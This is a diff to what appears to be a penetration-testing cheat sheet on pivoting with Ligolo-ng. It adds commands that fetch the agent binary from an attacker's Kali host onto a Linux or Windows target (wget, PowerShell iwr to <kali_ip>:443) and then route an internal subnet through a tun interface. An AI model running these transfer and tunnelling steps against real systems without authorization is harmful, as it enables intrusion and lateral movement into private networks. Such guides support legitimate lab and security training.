@@ -37,15 +37,19 @@ Move the agent file into the pivot host:
 # On Kali
 sudo cp /home/kali/Downloads/ligolo-ng_agent_0.7.2_linux_amd64/agent .
 python3 -m http.server 443
-# On Target
+# On Target (Linux)
+cd /tmp
 wget http://<kali_ip>:443/agent
+# On Target (Windows using PowerShell)
+cd C:\Windows\Temp
+powershell -c iwr http://<kali_ip>:443/agent.exe -OutFile agent.exe
 ```
 Set up Ligolo-Ng on Kali:
 ```shell
 # Create an interface
 sudo ip tuntap add user Vorkharium mode tun ligolo
 sudo ip link set ligolo up
-# Add new IP range we want to access
+# Add new IP range we want to access (Examine Pivot Host with ifconfig, ip a, etc commands)
 sudo ip route add 172.16.150.0/24 dev ligolo
 ip route list
 # Run the proxy file
